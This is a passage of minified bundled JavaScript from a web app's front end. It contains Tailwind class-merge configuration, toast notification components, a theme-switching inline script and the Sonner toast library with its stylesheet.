                "border-collapse": [{ border: ["collapse", "separate"] }],
                "border-spacing": [{ "border-spacing": [i] }],
                "border-spacing-x": [{ "border-spacing-x": [i] }],
                "border-spacing-y": [{ "border-spacing-y": [i] }],
                "table-layout": [{ table: ["auto", "fixed"] }],
                caption: [{ caption: ["top", "bottom"] }],
                transition: [{ transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", Q] }],
                duration: [{ duration: V() }],
                ease: [{ ease: ["linear", "in", "out", "in-out", Q] }],
                delay: [{ delay: V() }],
                animate: [{ animate: ["none", "spin", "ping", "pulse", "bounce", Q] }],
                transform: [{ transform: ["", "gpu", "none"] }],
                scale: [{ scale: [b] }],
                "scale-x": [{ "scale-x": [b] }],
                "scale-y": [{ "scale-y": [b] }],
                rotate: [{ rotate: [Lo, Q] }],
                "translate-x": [{ "translate-x": [j] }],
                "translate-y": [{ "translate-y": [j] }],
                "skew-x": [{ "skew-x": [C] }],
                "skew-y": [{ "skew-y": [C] }],
                "transform-origin": [
                    {
                        origin: [
                            "center",
                            "top",
                            "top-right",
                            "right",
                            "bottom-right",
                            "bottom",
                            "bottom-left",
                            "left",
                            "top-left",
                            Q,
                        ],
                    },
                ],
                accent: [{ accent: ["auto", e] }],
                appearance: [{ appearance: ["none", "auto"] }],
                cursor: [
                    {
                        cursor: [
                            "auto",
                            "default",
                            "pointer",
                            "wait",
                            "text",
                            "move",
                            "help",
                            "not-allowed",
                            "none",
                            "context-menu",
                            "progress",
                            "cell",
                            "crosshair",
                            "vertical-text",
                            "alias",
                            "copy",
                            "no-drop",
                            "grab",
                            "grabbing",
                            "all-scroll",
                            "col-resize",
                            "row-resize",
                            "n-resize",
                            "e-resize",
                            "s-resize",
                            "w-resize",
                            "ne-resize",
                            "nw-resize",
                            "se-resize",
                            "sw-resize",
                            "ew-resize",
                            "ns-resize",
                            "nesw-resize",
                            "nwse-resize",
                            "zoom-in",
                            "zoom-out",
                            Q,
                        ],
                    },
                ],
                "caret-color": [{ caret: [e] }],
                "pointer-events": [{ "pointer-events": ["none", "auto"] }],
                resize: [{ resize: ["none", "y", "x", ""] }],
                "scroll-behavior": [{ scroll: ["auto", "smooth"] }],
                "scroll-m": [{ "scroll-m": D() }],
                "scroll-mx": [{ "scroll-mx": D() }],
                "scroll-my": [{ "scroll-my": D() }],
                "scroll-ms": [{ "scroll-ms": D() }],
                "scroll-me": [{ "scroll-me": D() }],
                "scroll-mt": [{ "scroll-mt": D() }],
                "scroll-mr": [{ "scroll-mr": D() }],
                "scroll-mb": [{ "scroll-mb": D() }],
                "scroll-ml": [{ "scroll-ml": D() }],
                "scroll-p": [{ "scroll-p": D() }],
                "scroll-px": [{ "scroll-px": D() }],
                "scroll-py": [{ "scroll-py": D() }],
                "scroll-ps": [{ "scroll-ps": D() }],
                "scroll-pe": [{ "scroll-pe": D() }],
                "scroll-pt": [{ "scroll-pt": D() }],
                "scroll-pr": [{ "scroll-pr": D() }],
                "scroll-pb": [{ "scroll-pb": D() }],
                "scroll-pl": [{ "scroll-pl": D() }],
                "snap-align": [{ snap: ["start", "end", "center", "align-none"] }],
                "snap-stop": [{ snap: ["normal", "always"] }],
                "snap-type": [{ snap: ["none", "x", "y", "both"] }],
                "snap-strictness": [{ snap: ["mandatory", "proximity"] }],
                touch: [{ touch: ["auto", "none", "manipulation"] }],
                "touch-x": [{ "touch-pan": ["x", "left", "right"] }],
                "touch-y": [{ "touch-pan": ["y", "up", "down"] }],
                "touch-pz": ["touch-pinch-zoom"],
                select: [{ select: ["none", "text", "all", "auto"] }],
                "will-change": [{ "will-change": ["auto", "scroll", "contents", "transform", Q] }],
                fill: [{ fill: [e, "none"] }],
                "stroke-w": [{ stroke: [Bt, fn, fl] }],
                stroke: [{ stroke: [e, "none"] }],
                sr: ["sr-only", "not-sr-only"],
                "forced-color-adjust": [{ "forced-color-adjust": ["auto", "none"] }],
            },
            conflictingClassGroups: {
                overflow: ["overflow-x", "overflow-y"],
                overscroll: ["overscroll-x", "overscroll-y"],
                inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
                "inset-x": ["right", "left"],
                "inset-y": ["top", "bottom"],
                flex: ["basis", "grow", "shrink"],
                gap: ["gap-x", "gap-y"],
                p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
                px: ["pr", "pl"],
                py: ["pt", "pb"],
                m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
                mx: ["mr", "ml"],
                my: ["mt", "mb"],
                size: ["w", "h"],
                "font-size": ["leading"],
                "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
                "fvn-ordinal": ["fvn-normal"],
                "fvn-slashed-zero": ["fvn-normal"],
                "fvn-figure": ["fvn-normal"],
                "fvn-spacing": ["fvn-normal"],
                "fvn-fraction": ["fvn-normal"],
                "line-clamp": ["display", "overflow"],
                rounded: [
                    "rounded-s",
                    "rounded-e",
                    "rounded-t",
                    "rounded-r",
                    "rounded-b",
                    "rounded-l",
                    "rounded-ss",
                    "rounded-se",
                    "rounded-ee",
                    "rounded-es",
                    "rounded-tl",
                    "rounded-tr",
                    "rounded-br",
                    "rounded-bl",
                ],
                "rounded-s": ["rounded-ss", "rounded-es"],
                "rounded-e": ["rounded-se", "rounded-ee"],
                "rounded-t": ["rounded-tl", "rounded-tr"],
                "rounded-r": ["rounded-tr", "rounded-br"],
                "rounded-b": ["rounded-br", "rounded-bl"],
                "rounded-l": ["rounded-tl", "rounded-bl"],
                "border-spacing": ["border-spacing-x", "border-spacing-y"],
                "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
                "border-w-x": ["border-w-r", "border-w-l"],
                "border-w-y": ["border-w-t", "border-w-b"],
                "border-color": [
                    "border-color-s",
                    "border-color-e",
                    "border-color-t",
                    "border-color-r",
                    "border-color-b",
                    "border-color-l",
                ],
                "border-color-x": ["border-color-r", "border-color-l"],
                "border-color-y": ["border-color-t", "border-color-b"],
                "scroll-m": [
                    "scroll-mx",
                    "scroll-my",
                    "scroll-ms",
                    "scroll-me",
                    "scroll-mt",
                    "scroll-mr",
                    "scroll-mb",
                    "scroll-ml",
                ],
                "scroll-mx": ["scroll-mr", "scroll-ml"],
                "scroll-my": ["scroll-mt", "scroll-mb"],
                "scroll-p": [
                    "scroll-px",
                    "scroll-py",
                    "scroll-ps",
                    "scroll-pe",
                    "scroll-pt",
                    "scroll-pr",
                    "scroll-pb",
                    "scroll-pl",
                ],
                "scroll-px": ["scroll-pr", "scroll-pl"],
                "scroll-py": ["scroll-pt", "scroll-pb"],
                touch: ["touch-x", "touch-y", "touch-pz"],
                "touch-x": ["touch"],
                "touch-y": ["touch"],
                "touch-pz": ["touch"],
            },
            conflictingClassGroupModifiers: { "font-size": ["leading"] },
        };
    },
    Gx = jx(Qx);
function yr(...e) {
    return Gx(eg(e));
}
const qx = Wv,
    fg = x.forwardRef(({ className: e, ...t }, n) =>
        c.jsx(Qh, {
            ref: n,
            className: yr(
                "fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]",
                e
            ),
            ...t,
        })
    );
fg.displayName = Qh.displayName;
const Xx = Kv(
        "group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full",
        {
            variants: {
                variant: {
                    default: "border bg-background text-foreground",
                    destructive: "destructive group border-destructive bg-destructive text-destructive-foreground",
                },
            },
            defaultVariants: { variant: "default" },
        }
    ),
    mg = x.forwardRef(({ className: e, variant: t, ...n }, r) =>
        c.jsx(Gh, { ref: r, className: yr(Xx({ variant: t }), e), ...n })
    );
mg.displayName = Gh.displayName;
const Yx = x.forwardRef(({ className: e, ...t }, n) =>
    c.jsx(Yh, {
        ref: n,
        className: yr(
            "inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors group-[.destructive]:border-muted/40 hover:bg-secondary group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 group-[.destructive]:focus:ring-destructive disabled:pointer-events-none disabled:opacity-50",
            e
        ),
        ...t,
    })
);
Yx.displayName = Yh.displayName;
const hg = x.forwardRef(({ className: e, ...t }, n) =>
    c.jsx(Zh, {
        ref: n,
        className: yr(
            "absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity group-hover:opacity-100 group-[.destructive]:text-red-300 hover:text-foreground group-[.destructive]:hover:text-red-50 focus:opacity-100 focus:outline-none focus:ring-2 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600",
            e
        ),
        "toast-close": "",
        ...t,
        children: c.jsx(_u, { className: "h-4 w-4" }),
    })
);
hg.displayName = Zh.displayName;
const gg = x.forwardRef(({ className: e, ...t }, n) =>
    c.jsx(qh, { ref: n, className: yr("text-sm font-semibold", e), ...t })
);
gg.displayName = qh.displayName;
const yg = x.forwardRef(({ className: e, ...t }, n) =>
    c.jsx(Xh, { ref: n, className: yr("text-sm opacity-90", e), ...t })
);
yg.displayName = Xh.displayName;
function Zx() {
    const { toasts: e } = J1();
    return c.jsxs(qx, {
        children: [
            e.map(function ({ id: t, title: n, description: r, action: o, ...s }) {
                return c.jsxs(
                    mg,
                    {
                        ...s,
                        children: [
                            c.jsxs("div", {
                                className: "grid gap-1",
                                children: [n && c.jsx(gg, { children: n }), r && c.jsx(yg, { children: r })],
                            }),
                            o,
                            c.jsx(hg, {}),
                        ],
                    },
                    t
                );
            }),
            c.jsx(fg, {}),
        ],
    });
}
var Ep = ["light", "dark"],
    Jx = "(prefers-color-scheme: dark)",
    ew = x.createContext(void 0),
    tw = { setTheme: (e) => {}, themes: [] },
    nw = () => {
        var e;
        return (e = x.useContext(ew)) != null ? e : tw;
    };
x.memo(
    ({
        forcedTheme: e,
        storageKey: t,
        attribute: n,
        enableSystem: r,
        enableColorScheme: o,
        defaultTheme: s,
        value: i,
        attrs: a,
        nonce: l,
    }) => {
        let u = s === "system",
            d =
                n === "class"
                    ? `var d=document.documentElement,c=d.classList;${`c.remove(${a.map((S) => `'${S}'`).join(",")})`};`
                    : `var d=document.documentElement,n='${n}',s='setAttribute';`,
            p = o
                ? Ep.includes(s) && s
                    ? `if(e==='light'||e==='dark'||!e)d.style.colorScheme=e||'${s}'`
                    : "if(e==='light'||e==='dark')d.style.colorScheme=e"
                : "",
            m = (S, v = !1, w = !0) => {
                let g = i ? i[S] : S,
                    h = v ? S + "|| ''" : `'${g}'`,
                    y = "";
                return (
                    o && w && !v && Ep.includes(S) && (y += `d.style.colorScheme = '${S}';`),
                    n === "class" ? (v || g ? (y += `c.add(${h})`) : (y += "null")) : g && (y += `d[s](n,${h})`),
                    y
                );
            },
            f = e
                ? `!function(){${d}${m(e)}}()`
                : r
                  ? `!function(){try{${d}var e=localStorage.getItem('${t}');if('system'===e||(!e&&${u})){var t='${Jx}',m=window.matchMedia(t);if(m.media!==t||m.matches){${m("dark")}}else{${m("light")}}}else if(e){${i ? `var x=${JSON.stringify(i)};` : ""}${m(i ? "x[e]" : "e", !0)}}${u ? "" : "else{" + m(s, !1, !1) + "}"}${p}}catch(e){}}()`
                  : `!function(){try{${d}var e=localStorage.getItem('${t}');if(e){${i ? `var x=${JSON.stringify(i)};` : ""}${m(i ? "x[e]" : "e", !0)}}else{${m(s, !1, !1)};}${p}}catch(t){}}();`;
        return x.createElement("script", { nonce: l, dangerouslySetInnerHTML: { __html: f } });
    }
);
var rw = (e) => {
        switch (e) {
            case "success":
                return iw;
            case "info":
                return lw;
            case "warning":
                return aw;
            case "error":
                return cw;
            default:
                return null;
        }
    },
    ow = Array(12).fill(0),
    sw = ({ visible: e, className: t }) =>
        A.createElement(
            "div",
            { className: ["sonner-loading-wrapper", t].filter(Boolean).join(" "), "data-visible": e },
            A.createElement(
                "div",
                { className: "sonner-spinner" },
                ow.map((n, r) => A.createElement("div", { className: "sonner-loading-bar", key: `spinner-bar-${r}` }))
            )
        ),
    iw = A.createElement(
        "svg",
        { xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 20 20", fill: "currentColor", height: "20", width: "20" },
        A.createElement("path", {
            fillRule: "evenodd",
            d: "M10 18a8 8 0 100-16 8 8 0 000 16zm3.857-9.809a.75.75 0 00-1.214-.882l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z",
            clipRule: "evenodd",
        })
    ),
    aw = A.createElement(
        "svg",
        { xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 24 24", fill: "currentColor", height: "20", width: "20" },
        A.createElement("path", {
            fillRule: "evenodd",
            d: "M9.401 3.003c1.155-2 4.043-2 5.197 0l7.355 12.748c1.154 2-.29 4.5-2.599 4.5H4.645c-2.309 0-3.752-2.5-2.598-4.5L9.4 3.003zM12 8.25a.75.75 0 01.75.75v3.75a.75.75 0 01-1.5 0V9a.75.75 0 01.75-.75zm0 8.25a.75.75 0 100-1.5.75.75 0 000 1.5z",
            clipRule: "evenodd",
        })
    ),
    lw = A.createElement(
        "svg",
        { xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 20 20", fill: "currentColor", height: "20", width: "20" },
        A.createElement("path", {
            fillRule: "evenodd",
            d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z",
            clipRule: "evenodd",
        })
    ),
    cw = A.createElement(
        "svg",
        { xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 20 20", fill: "currentColor", height: "20", width: "20" },
        A.createElement("path", {
            fillRule: "evenodd",
            d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-5a.75.75 0 01.75.75v4.5a.75.75 0 01-1.5 0v-4.5A.75.75 0 0110 5zm0 10a1 1 0 100-2 1 1 0 000 2z",
            clipRule: "evenodd",
        })
    ),
    uw = A.createElement(
        "svg",
        {
            xmlns: "http://www.w3.org/2000/svg",
            width: "12",
            height: "12",
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "1.5",
            strokeLinecap: "round",
            strokeLinejoin: "round",
        },
        A.createElement("line", { x1: "18", y1: "6", x2: "6", y2: "18" }),
        A.createElement("line", { x1: "6", y1: "6", x2: "18", y2: "18" })
    ),
    dw = () => {
        let [e, t] = A.useState(document.hidden);
        return (
            A.useEffect(() => {
                let n = () => {
                    t(document.hidden);
                };
                return (
                    document.addEventListener("visibilitychange", n),
                    () => window.removeEventListener("visibilitychange", n)
                );
            }, []),
            e
        );
    },
    bc = 1,
    pw = class {
        constructor() {
            (this.subscribe = (e) => (
                this.subscribers.push(e),
                () => {
                    let t = this.subscribers.indexOf(e);
                    this.subscribers.splice(t, 1);
                }
            )),
                (this.publish = (e) => {
                    this.subscribers.forEach((t) => t(e));
                }),
                (this.addToast = (e) => {
                    this.publish(e), (this.toasts = [...this.toasts, e]);
                }),
                (this.create = (e) => {
                    var t;
                    let { message: n, ...r } = e,
                        o =
                            typeof (e == null ? void 0 : e.id) == "number" ||
                            ((t = e.id) == null ? void 0 : t.length) > 0
                                ? e.id
                                : bc++,
                        s = this.toasts.find((a) => a.id === o),
                        i = e.dismissible === void 0 ? !0 : e.dismissible;
                    return (
                        this.dismissedToasts.has(o) && this.dismissedToasts.delete(o),
                        s
                            ? (this.toasts = this.toasts.map((a) =>
                                  a.id === o
                                      ? (this.publish({ ...a, ...e, id: o, title: n }),
                                        { ...a, ...e, id: o, dismissible: i, title: n })
                                      : a
                              ))
                            : this.addToast({ title: n, ...r, dismissible: i, id: o }),
                        o
                    );
                }),
                (this.dismiss = (e) => (
                    this.dismissedToasts.add(e),
                    e ||
                        this.toasts.forEach((t) => {
                            this.subscribers.forEach((n) => n({ id: t.id, dismiss: !0 }));
                        }),
                    this.subscribers.forEach((t) => t({ id: e, dismiss: !0 })),
                    e
                )),
                (this.message = (e, t) => this.create({ ...t, message: e })),
                (this.error = (e, t) => this.create({ ...t, message: e, type: "error" })),
                (this.success = (e, t) => this.create({ ...t, type: "success", message: e })),
                (this.info = (e, t) => this.create({ ...t, type: "info", message: e })),
                (this.warning = (e, t) => this.create({ ...t, type: "warning", message: e })),
                (this.loading = (e, t) => this.create({ ...t, type: "loading", message: e })),
                (this.promise = (e, t) => {
                    if (!t) return;
                    let n;
                    t.loading !== void 0 &&
                        (n = this.create({
                            ...t,
                            promise: e,
                            type: "loading",
                            message: t.loading,
                            description: typeof t.description != "function" ? t.description : void 0,
                        }));
                    let r = e instanceof Promise ? e : e(),
                        o = n !== void 0,
                        s,
                        i = r
                            .then(async (l) => {
                                if (((s = ["resolve", l]), A.isValidElement(l)))
                                    (o = !1), this.create({ id: n, type: "default", message: l });
                                else if (mw(l) && !l.ok) {
                                    o = !1;
                                    let u =
                                            typeof t.error == "function"
                                                ? await t.error(`HTTP error! status: ${l.status}`)
                                                : t.error,
                                        d =
                                            typeof t.description == "function"
                                                ? await t.description(`HTTP error! status: ${l.status}`)
                                                : t.description;
                                    this.create({ id: n, type: "error", message: u, description: d });
                                } else if (t.success !== void 0) {
                                    o = !1;
                                    let u = typeof t.success == "function" ? await t.success(l) : t.success,
                                        d = typeof t.description == "function" ? await t.description(l) : t.description;
                                    this.create({ id: n, type: "success", message: u, description: d });
                                }
                            })
                            .catch(async (l) => {
                                if (((s = ["reject", l]), t.error !== void 0)) {
                                    o = !1;
                                    let u = typeof t.error == "function" ? await t.error(l) : t.error,
                                        d = typeof t.description == "function" ? await t.description(l) : t.description;
                                    this.create({ id: n, type: "error", message: u, description: d });
                                }
                            })
                            .finally(() => {
                                var l;
                                o && (this.dismiss(n), (n = void 0)), (l = t.finally) == null || l.call(t);
                            }),
                        a = () => new Promise((l, u) => i.then(() => (s[0] === "reject" ? u(s[1]) : l(s[1]))).catch(u));
                    return typeof n != "string" && typeof n != "number"
                        ? { unwrap: a }
                        : Object.assign(n, { unwrap: a });
                }),
                (this.custom = (e, t) => {
                    let n = (t == null ? void 0 : t.id) || bc++;
                    return this.create({ jsx: e(n), id: n, ...t }), n;
                }),
                (this.getActiveToasts = () => this.toasts.filter((e) => !this.dismissedToasts.has(e.id))),
                (this.subscribers = []),
                (this.toasts = []),
                (this.dismissedToasts = new Set());
        }
    },
    Ue = new pw(),
    fw = (e, t) => {
        let n = (t == null ? void 0 : t.id) || bc++;
        return Ue.addToast({ title: e, ...t, id: n }), n;
    },
    mw = (e) =>
        e &&
        typeof e == "object" &&
        "ok" in e &&
        typeof e.ok == "boolean" &&
        "status" in e &&
        typeof e.status == "number",
    hw = fw,
    gw = () => Ue.toasts,
    yw = () => Ue.getActiveToasts();
Object.assign(
    hw,
    {
        success: Ue.success,
        info: Ue.info,
        warning: Ue.warning,
        error: Ue.error,
        custom: Ue.custom,
        message: Ue.message,
        promise: Ue.promise,
        dismiss: Ue.dismiss,
        loading: Ue.loading,
    },
    { getHistory: gw, getToasts: yw }
);
function vw(e, { insertAt: t } = {}) {
    if (typeof document > "u") return;
    let n = document.head || document.getElementsByTagName("head")[0],
        r = document.createElement("style");
    (r.type = "text/css"),
        t === "top" && n.firstChild ? n.insertBefore(r, n.firstChild) : n.appendChild(r),
        r.styleSheet ? (r.styleSheet.cssText = e) : r.appendChild(document.createTextNode(e));
}
vw(`:where(html[dir="ltr"]),:where([data-sonner-toaster][dir="ltr"]){--toast-icon-margin-start: -3px;--toast-icon-margin-end: 4px;--toast-svg-margin-start: -1px;--toast-svg-margin-end: 0px;--toast-button-margin-start: auto;--toast-button-margin-end: 0;--toast-close-button-start: 0;--toast-close-button-end: unset;--toast-close-button-transform: translate(-35%, -35%)}:where(html[dir="rtl"]),:where([data-sonner-toaster][dir="rtl"]){--toast-icon-margin-start: 4px;--toast-icon-margin-end: -3px;--toast-svg-margin-start: 0px;--toast-svg-margin-end: -1px;--toast-button-margin-start: 0;--toast-button-margin-end: auto;--toast-close-button-start: unset;--toast-close-button-end: 0;--toast-close-button-transform: translate(35%, -35%)}:where([data-sonner-toaster]){position:fixed;width:var(--width);font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;--gray1: hsl(0, 0%, 99%);--gray2: hsl(0, 0%, 97.3%);--gray3: hsl(0, 0%, 95.1%);--gray4: hsl(0, 0%, 93%);--gray5: hsl(0, 0%, 90.9%);--gray6: hsl(0, 0%, 88.7%);--gray7: hsl(0, 0%, 85.8%);--gray8: hsl(0, 0%, 78%);--gray9: hsl(0, 0%, 56.1%);--gray10: hsl(0, 0%, 52.3%);--gray11: hsl(0, 0%, 43.5%);--gray12: hsl(0, 0%, 9%);--border-radius: 8px;box-sizing:border-box;padding:0;margin:0;list-style:none;outline:none;z-index:999999999;transition:transform .4s ease}:where([data-sonner-toaster][data-lifted="true"]){transform:translateY(-10px)}@media (hover: none) and (pointer: coarse){:where([data-sonner-toaster][data-lifted="true"]){transform:none}}:where([data-sonner-toaster][data-x-position="right"]){right:var(--offset-right)}:where([data-sonner-toaster][data-x-position="left"]){left:var(--offset-left)}:where([data-sonner-toaster][data-x-position="center"]){left:50%;transform:translate(-50%)}:where([data-sonner-toaster][data-y-position="top"]){top:var(--offset-top)}:where([data-sonner-toaster][data-y-position="bottom"]){bottom:var(--offset-bottom)}:where([data-sonner-toast]){--y: translateY(100%);--lift-amount: calc(var(--lift) * var(--gap));z-index:var(--z-index);position:absolute;opacity:0;transform:var(--y);filter:blur(0);touch-action:none;transition:transform .4s,opacity .4s,height .4s,box-shadow .2s;box-sizing:border-box;outline:none;overflow-wrap:anywhere}:where([data-sonner-toast][data-styled="true"]){padding:16px;background:var(--normal-bg);border:1px solid var(--normal-border);color:var(--normal-text);border-radius:var(--border-radius);box-shadow:0 4px 12px #0000001a;width:var(--width);font-size:13px;display:flex;align-items:center;gap:6px}:where([data-sonner-toast]:focus-visible){box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}:where([data-sonner-toast][data-y-position="top"]){top:0;--y: translateY(-100%);--lift: 1;--lift-amount: calc(1 * var(--gap))}:where([data-sonner-toast][data-y-position="bottom"]){bottom:0;--y: translateY(100%);--lift: -1;--lift-amount: calc(var(--lift) * var(--gap))}:where([data-sonner-toast]) :where([data-description]){font-weight:400;line-height:1.4;color:inherit}:where([data-sonner-toast]) :where([data-title]){font-weight:500;line-height:1.5;color:inherit}:where([data-sonner-toast]) :where([data-icon]){display:flex;height:16px;width:16px;position:relative;justify-content:flex-start;align-items:center;flex-shrink:0;margin-left:var(--toast-icon-margin-start);margin-right:var(--toast-icon-margin-end)}:where([data-sonner-toast][data-promise="true"]) :where([data-icon])>svg{opacity:0;transform:scale(.8);transform-origin:center;animation:sonner-fade-in .3s ease forwards}:where([data-sonner-toast]) :where([data-icon])>*{flex-shrink:0}:where([data-sonner-toast]) :where([data-icon]) svg{margin-left:var(--toast-svg-margin-start);margin-right:var(--toast-svg-margin-end)}:where([data-sonner-toast]) :where([data-content]){display:flex;flex-direction:column;gap:2px}[data-sonner-toast][data-styled=true] [data-button]{border-radius:4px;padding-left:8px;padding-right:8px;height:24px;font-size:12px;color:var(--normal-bg);background:var(--normal-text);margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end);border:none;cursor:pointer;outline:none;display:flex;align-items:center;flex-shrink:0;transition:opacity .4s,box-shadow .2s}:where([data-sonner-toast]) :where([data-button]):focus-visible{box-shadow:0 0 0 2px #0006}:where([data-sonner-toast]) :where([data-button]):first-of-type{margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end)}:where([data-sonner-toast]) :where([data-cancel]){color:var(--normal-text);background:rgba(0,0,0,.08)}:where([data-sonner-toast][data-theme="dark"]) :where([data-cancel]){background:rgba(255,255,255,.3)}:where([data-sonner-toast]) :where([data-close-button]){position:absolute;left:var(--toast-close-button-start);right:var(--toast-close-button-end);top:0;height:20px;width:20px;display:flex;justify-content:center;align-items:center;padding:0;color:var(--gray12);border:1px solid var(--gray4);transform:var(--toast-close-button-transform);border-radius:50%;cursor:pointer;z-index:1;transition:opacity .1s,background .2s,border-color .2s}[data-sonner-toast] [data-close-button]{background:var(--gray1)}:where([data-sonner-toast]) :where([data-close-button]):focus-visible{box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}:where([data-sonner-toast]) :where([data-disabled="true"]){cursor:not-allowed}:where([data-sonner-toast]):hover :where([data-close-button]):hover{background:var(--gray2);border-color:var(--gray5)}:where([data-sonner-toast][data-swiping="true"]):before{content:"";position:absolute;left:-50%;right:-50%;height:100%;z-index:-1}:where([data-sonner-toast][data-y-position="top"][data-swiping="true"]):before{bottom:50%;transform:scaleY(3) translateY(50%)}:where([data-sonner-toast][data-y-position="bottom"][data-swiping="true"]):before{top:50%;transform:scaleY(3) translateY(-50%)}:where([data-sonner-toast][data-swiping="false"][data-removed="true"]):before{content:"";position:absolute;inset:0;transform:scaleY(2)}:where([data-sonner-toast]):after{content:"";position:absolute;left:0;height:calc(var(--gap) + 1px);bottom:100%;width:100%}:where([data-sonner-toast][data-mounted="true"]){--y: translateY(0);opacity:1}:where([data-sonner-toast][data-expanded="false"][data-front="false"]){--scale: var(--toasts-before) * .05 + 1;--y: translateY(calc(var(--lift-amount) * var(--toasts-before))) scale(calc(-1 * var(--scale)));height:var(--front-toast-height)}:where([data-sonner-toast])>*{transition:opacity .4s}:where([data-sonner-toast][data-expanded="false"][data-front="false"][data-styled="true"])>*{opacity:0}:where([data-sonner-toast][data-visible="false"]){opacity:0;pointer-events:none}:where([data-sonner-toast][data-mounted="true"][data-expanded="true"]){--y: translateY(calc(var(--lift) * var(--offset)));height:var(--initial-height)}:where([data-sonner-toast][data-removed="true"][data-front="true"][data-swipe-out="false"]){--y: translateY(calc(var(--lift) * -100%));opacity:0}:where([data-sonner-toast][data-removed="true"][data-front="false"][data-swipe-out="false"][data-expanded="true"]){--y: translateY(calc(var(--lift) * var(--offset) + var(--lift) * -100%));opacity:0}:where([data-sonner-toast][data-removed="true"][data-front="false"][data-swipe-out="false"][data-expanded="false"]){--y: translateY(40%);opacity:0;transition:transform .5s,opacity .2s}:where([data-sonner-toast][data-removed="true"][data-front="false"]):before{height:calc(var(--initial-height) + 20%)}[data-sonner-toast][data-swiping=true]{transform:var(--y) translateY(var(--swipe-amount-y, 0px)) translate(var(--swipe-amount-x, 0px));transition:none}[data-sonner-toast][data-swiped=true]{user-select:none}[data-sonner-toast][data-swipe-out=true][data-y-position=bottom],[data-sonner-toast][data-swipe-out=true][data-y-position=top]{animation-duration:.2s;animation-timing-function:ease-out;animation-fill-mode:forwards}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=left]{animation-name:swipe-out-left}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=right]{animation-name:swipe-out-right}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=up]{animation-name:swipe-out-up}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=down]{animation-name:swipe-out-down}@keyframes swipe-out-left{0%{transform:var(--y) translate(var(--swipe-amount-x));opacity:1}to{transform:var(--y) translate(calc(var(--swipe-amount-x) - 100%));opacity:0}}@keyframes swipe-out-right{0%{transform:var(--y) translate(var(--swipe-amount-x));opacity:1}to{transform:var(--y) translate(calc(var(--swipe-amount-x) + 100%));opacity:0}}@keyframes swipe-out-up{0%{transform:var(--y) translateY(var(--swipe-amount-y));opacity:1}to{transform:var(--y) translateY(calc(var(--swipe-amount-y) - 100%));opacity:0}}@keyframes swipe-out-down{0%{transform:var(--y) translateY(var(--swipe-amount-y));opacity:1}to{transform:var(--y) translateY(calc(var(--swipe-amount-y) + 100%));opacity:0}}@media (max-width: 600px){[data-sonner-toaster]{position:fixed;right:var(--mobile-offset-right);left:var(--mobile-offset-left);width:100%}[data-sonner-toaster][dir=rtl]{left:calc(var(--mobile-offset-left) * -1)}[data-sonner-toaster] [data-sonner-toast]{left:0;right:0;width:calc(100% - var(--mobile-offset-left) * 2)}[data-sonner-toaster][data-x-position=left]{left:var(--mobile-offset-left)}[data-sonner-toaster][data-y-position=bottom]{bottom:var(--mobile-offset-bottom)}[data-sonner-toaster][data-y-position=top]{top:var(--mobile-offset-top)}[data-sonner-toaster][data-x-position=center]{left:var(--mobile-offset-left);right:var(--mobile-offset-right);transform:none}}[data-sonner-toaster][data-theme=light]{--normal-bg: #fff;--normal-border: var(--gray4);--normal-text: var(--gray12);--success-bg: hsl(143, 85%, 96%);--success-border: hsl(145, 92%, 91%);--success-text: hsl(140, 100%, 27%);--info-bg: hsl(208, 100%, 97%);--info-border: hsl(221, 91%, 91%);--info-text: hsl(210, 92%, 45%);--warning-bg: hsl(49, 100%, 97%);--warning-border: hsl(49, 91%, 91%);--warning-text: hsl(31, 92%, 